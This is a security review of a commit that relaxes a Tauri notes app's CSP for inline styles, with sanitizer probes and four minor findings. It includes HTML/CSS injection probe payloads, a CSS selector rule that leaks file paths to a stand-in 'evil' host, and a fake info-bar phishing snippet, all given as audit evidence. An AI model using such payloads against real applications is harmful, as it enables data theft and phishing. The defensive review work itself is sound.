# Review windows-fixes R1 (commit dfe8115, branch claude/windows-fixes)

Scope: `dangerousDisableAssetCspModification: ["style-src"]` in `src-tauri/tauri.conf.json` and `.editor-pane .cm-content:focus-visible { outline: none; }` in `src/styles/main.css`, against SPEC §8 and CLAUDE.md guardrails 7-9.

Verdict: safe to merge; no path was found that lets a note inject CSS, and the change only restores the CSP the config always stated, but a narrower fix (CodeMirror `cspNonce` with the nonce Tauri already puts on the index.html `<style>`) is practical and would keep the defense-in-depth layer the change gives up.

## What was checked

- Why the nonce appeared: `dist/index.html` keeps the inline `<style>html{background:#fff}...</style>`. tauri-codegen `context.rs` runs `inject_nonce_token` on every HTML asset (tauri-utils `html.rs:156`, `inject_nonce(document, "style", STYLE_NONCE_TOKEN)`), and tauri `manager/mod.rs` `replace_csp_nonce` adds `'nonce-N'` to `style-src` whenever a nonce or hash exists. With a nonce present, CSP Level 3 ignores `'unsafe-inline'`. The commit's explanation matches the source.
- Effect of the flag: `can_modify("style-src")` is false, so the release `style-src` is exactly `'self' 'unsafe-inline'`. Script nonces and hashes remain (`can_modify("script-src")` path untouched). SPEC §8 line 110 forbids `unsafe-inline` scripts only; the change does not contradict the SPEC.
- style-mod 4.1.4 (`StyleSet` constructor): for a `Document` with a `head` it always creates a `<style>` tag, adopted sheets are only used for shadow roots, so the blocked-styles diagnosis holds. It sets `nonce` when given one.
- Read-mode sanitizer, probed with the exact config from `src/preview/render.ts` in jsdom + DOMPurify (scratch script):
  - `<style>body{display:none}</style>` => `""`
  - `<p style="color:red">x</p>` => `<p>x</p>`
  - `<svg><style>*{}</style></svg>` => `""`
  - `<link rel="stylesheet" href="https://e.x/a.css">` => `""`
  - `<math><mtext><table><mglyph><style><img src=x></style>` => `""`
  - `<noscript><style>a</style></noscript>`, `<template><style>a</style></template>` => `""`
  - `<p class="infobar error">fake</p>` => kept unchanged (see m3)
  - `<font color=red>`, `<table bgcolor=red>` => kept (presentational attributes, not CSP governed, harmless)
- Other DOM sinks for note text: `src/app.ts:137` `innerHTML = SKELETON` is a static string; info bar text uses `textContent` (`src/infobar.ts:68`); tab titles use `textContent` and the `title` property (`src/titlebar.ts:134-138`); the image widget sets `img.alt`/`img.src` as properties and builds placeholders with DOM APIs (`src/editor/imageWidget.ts:94-115`); read-mode alt is escaped then sanitized; `mdStyle.ts` line decorations use fixed class names. No `insertAdjacentHTML`, `outerHTML`, `cssText` or `setAttribute('style')` in `src/`.
- CodeMirror style attributes: `updateAttrs` (`@codemirror/view` dist line 79-99) writes `style` through `dom.style.cssText` (CSSOM), which CSP does not govern, so a nonce-based CSP would not break decorations that carry `style`.
- `npx vitest run src/preview`: 16 tests pass.

## Blockers

None.

## Majors

None.

## Minors

| id | severity | location | statement | evidence |
|---|---|---|---|---|
| m1 | minor | `src-tauri/tauri.conf.json` app.security | The change removes a defense-in-depth layer. Before it, the release CSP carried a style nonce, so any nonce-less `<style>` or `style=""` that slipped past DOMPurify was blocked. Now it applies, and because `img-src` allows `https: http:`, injected CSS could beacon to any host and leak attribute values by selector (for example `.tab[title^="C:\\Users\\a"]{background:url(https://evil/a)}` reads full note paths from tab tooltips, and `img[src^=...]` reads asset URLs). Scenario needs a future sanitizer gap or a new `innerHTML` sink. None exists today, so this is not an exploit. | CSP line: `img-src 'self' asset: http://asset.localhost https: http:`; `src/titlebar.ts:135` `const tip = tab.filePath ?? ...; t.el.title = tip`; DOMPurify probes above all strip style. |
| m2 | minor | `src-tauri/tauri.conf.json`, `src/editor/setup.ts` | A narrower fix is practical in Tauri 2.12: Tauri already writes a per-load nonce onto the index.html `<style>`; the frontend can read it (`document.querySelector('style[nonce]')?.nonce`, the IDL property survives nonce hiding) and pass `EditorView.cspNonce.of(nonce)` in the editor extensions. style-mod sets it on its `<style>` tag (`if (nonce) this.styleTag.setAttribute("nonce", nonce)`), CodeMirror style attributes go through CSSOM, and the app writes no style attributes, so nothing else should break. This keeps `'unsafe-inline'` inert for note-borne CSS. Not tested in WebView2; it needs one `windows-run.yml` screenshot. A second option, removing the inline `<style>` from index.html, avoids the `dangerous*` flag but gives the same effective policy as this commit, so it is not narrower. | `@codemirror/view` dist line 8382-8383: `let nonce = this.state.facet(EditorView.cspNonce); StyleModule.mount(this.root, ..., nonce ? { nonce } : undefined)`; tauri-utils `html.rs:156`; `dist/index.html` keeps the inline `<style>`. |
| m3 | minor | `src/preview/render.ts` SANITIZE (pre-existing, not from this commit) | A note keeps `class` attributes, and the app's classes are unscoped, so a note in read mode can draw a fake info bar (`<p class="infobar error">Note damaged. <a href="https://evil">Repair</a></p>`) styled exactly like SPEC §4's trusted message channel. This works with or without the CSP change, since the styling comes from `main.css` ('self'). | Probe output: `"<p class=\"infobar error\">fake</p>" => "<p class=\"infobar error\">fake</p>"`; `main.css:159` `.infobar { ... background: var(--info-bg) ...}`, `:162` `.infobar.error { background: var(--error-bg); }`. |
| m4 | minor | `src/styles/main.css:198` together with `:197` and `:202` | Focus indicator for the editor. The 2px accent `.cm-cursor` (`main.css:203`) is a reasonable focus indicator for a text surface (2.4.7), so removing the outline is acceptable. But focused and unfocused selections are drawn the same, so after Ctrl+A or a selection whose head is scrolled off screen, nothing visible tells a keyboard user whether focus is in the editor or in the tab strip. Scenario: Ctrl+A, then Tab or Shift+Tab, and the view looks identical. A focused/unfocused selection shade difference, or a subtle focus line on `.cm-editor.cm-focused`, would close it. Whether the caret alone meets 2.4.7 is my reading of common practice; I could not open the WCAG Understanding page (no network). | `main.css:202` `.editor-pane .cm-selectionBackground, .editor-pane .cm-focused .cm-selectionBackground { background: var(--selection) !important; }`; `:197` `.cm-editor.cm-focused { outline: none; }`; `:198` the new rule. |
